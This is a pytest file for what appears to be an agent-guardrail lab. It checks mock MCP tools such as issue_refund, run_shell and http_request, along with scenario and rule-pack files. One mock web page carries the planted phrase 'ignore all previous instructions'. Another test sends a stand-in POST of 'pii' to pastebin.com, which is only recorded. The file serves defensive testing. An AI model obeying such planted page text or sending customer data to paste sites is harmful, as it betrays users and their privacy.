import socket
from pathlib import Path

import pytest
import yaml
from mcp import Client

from precheck.core.schema import RulePack
from precheck.core.schema.rule import live_problems
from precheck.core.schema.scenario import Scenario
from precheck.core.settings import EXAMPLES_DIR
from precheck.lab.tools.server import build_server

EXAMPLES = EXAMPLES_DIR
TOOLS = {
    "lookup_order",
    "read_customer_profile",
    "issue_refund",
    "send_email",
    "http_request",
    "fetch_web_page",
    "delete_customer",
    "run_shell",
}


async def test_labtools_list_eight_tools_with_schemas() -> None:
    server, _ = build_server()
    async with Client(server) as c:
        tools = {t.name: t for t in (await c.list_tools()).tools}
    assert set(tools) == TOOLS
    assert tools["issue_refund"].input_schema["required"] == ["order_id", "amount", "destination"]
    assert "ctx" not in tools["issue_refund"].input_schema["properties"]
    assert tools["http_request"].input_schema["required"] == ["method", "url"]


async def test_labtools_deterministic_outputs_and_call_log() -> None:
    server, log = build_server()
    async with Client(server) as c:
        order = (await c.call_tool("lookup_order", {"order_id": "1234"})).structured_content
        assert order["paid_with"] == "Visa ending 4242" and order["amount"] == 120.0
        profile = (
            await c.call_tool("read_customer_profile", {"customer_id": "c_88"})
        ).structured_content
        assert profile["email"] == "jane.doe@example.com"
        refund = (
            await c.call_tool(
                "issue_refund", {"order_id": "1234", "amount": 120, "destination": "Visa"}
            )
        ).structured_content
        assert refund == {
            "refund_id": "rf_1234_12000",
            "status": "issued",
            "amount": 120.0,
            "destination": "Visa",
        }
        page = (
            await c.call_tool(
                "fetch_web_page", {"url": "https://reviews.example.org/espresso-machine"}
            )
        ).structured_content
        assert "ignore all previous instructions" in page["text"]
        missing = await c.call_tool("lookup_order", {"order_id": "nope"})
        assert missing.is_error and "not found" in missing.content[0].text
        await c.call_tool("run_shell", {"command": "ls"})
        await c.call_tool("delete_customer", {"customer_id": "c_42"})
        await c.call_tool("send_email", {"to": "a@b.c", "subject": "s", "body": "b"})
    assert [r.tool for r in log.for_session("local")] == [
        "lookup_order",
        "read_customer_profile",
        "issue_refund",
        "fetch_web_page",
        "lookup_order",
        "run_shell",
        "delete_customer",
        "send_email",
    ]
    assert [r.seq for r in log.records] == list(range(1, 9))
    assert log.for_session("other") == []
    log.clear()
    assert log.records == []


async def test_http_request_no_socket(monkeypatch: pytest.MonkeyPatch) -> None:
    def refuse(*args: object, **kwargs: object) -> None:
        raise AssertionError("http_request tried to open a network connection")

    server, log = build_server()
    async with Client(server) as c:
        monkeypatch.setattr(socket.socket, "connect", refuse)
        monkeypatch.setattr(socket, "create_connection", refuse)
        res = await c.call_tool(
            "http_request", {"method": "POST", "url": "https://pastebin.com/x", "body": "pii"}
        )
    assert not res.is_error and res.structured_content["recorded"] is True
    assert log.records[-1].args == {
        "method": "POST",
        "url": "https://pastebin.com/x",
        "body": "pii",
    }


def test_rulepack_valid() -> None:
    pack = RulePack.model_validate(
        yaml.safe_load((EXAMPLES / "rulepacks" / "demo.yaml").read_text())
    )
    assert len(pack.rules) == 7
    assert {r.gate.value for r in pack.rules} == {"tool_call", "ingress"}
    assert all(live_problems(r.body) == [] for r in pack.rules)  # seedable as live (pinned)


@pytest.mark.parametrize(
    "path", sorted((EXAMPLES / "scenarios").glob("*.yaml")), ids=lambda p: p.stem
)
def test_scenario_valid(path: Path) -> None:
    s = Scenario.model_validate(yaml.safe_load(path.read_text()))
    assert s.id == path.stem
    tools_used = {step.tool for step in s.steps}
    assert tools_used <= TOOLS


def test_scenario_count() -> None:
    assert len(list((EXAMPLES / "scenarios").glob("*.yaml"))) == 9


def test_scenario_rejects_inconsistent_step() -> None:
    bad = {
        "id": "x",
        "title": "x",
        "description": "x",
        "agent": {"id": "a", "purpose": "p"},
        "user_goal": "g",
        "steps": [{"tool": "run_shell", "expected_verdict": "deny", "expect_reached_tool": True}],
    }
    with pytest.raises(ValueError, match="expect_reached_tool"):
        Scenario.model_validate(bad)
